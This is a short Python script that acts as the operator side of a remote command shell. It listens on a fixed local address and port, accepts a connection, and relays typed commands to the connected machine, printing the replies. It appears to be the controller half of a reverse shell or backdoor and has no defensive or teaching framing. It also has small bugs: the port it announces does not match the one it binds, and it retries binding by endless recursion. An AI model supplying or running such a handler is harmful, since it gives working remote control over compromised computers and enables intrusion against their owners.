import sys, errno
import socket
from signal import signal, SIGPIPE, SIG_DFL 
#Ignore SIG_PIPE and don't throw exceptions on it... (http://docs.python.org/library/signal.html)
signal(SIGPIPE,SIG_DFL)






#Creating the socket
sock=socket.socket()




def binding():
    try:
        #Trying to bind the socket with ipaddr and portno of server
        sock.bind(('192.168.43.86',5000))

        #checking for error while binding the socket and catching them 
    except :
        print("sorry found some error while binding")
        #if there is any we try to bind the socket again .so we using recurrsion
        binding()
    else:
        print('binded successfully')
        #listening for connection 
        sock.listen(5)
        print(f"listening in the port 50001")

def accepting():
    #accepting the incoming connection
    connection,address=sock.accept()

    print(f"got connection from {address[0]} and {address[1]}")

    #Recieving the current directory from client
    cwd=connection.recv(1024).decode()

    while True:
        command=input(f"{cwd} >")
        
        if (len(command))<=0:
            print("Enter the valid command")

        elif(command.lower()=='quit'):
            sock.close()
            connection.close()
            break

        else:
            connection.send(command.encode())
          
            client_response=connection.recv(1024).decode()
            print(client_response,end="")
            


binding()
accepting()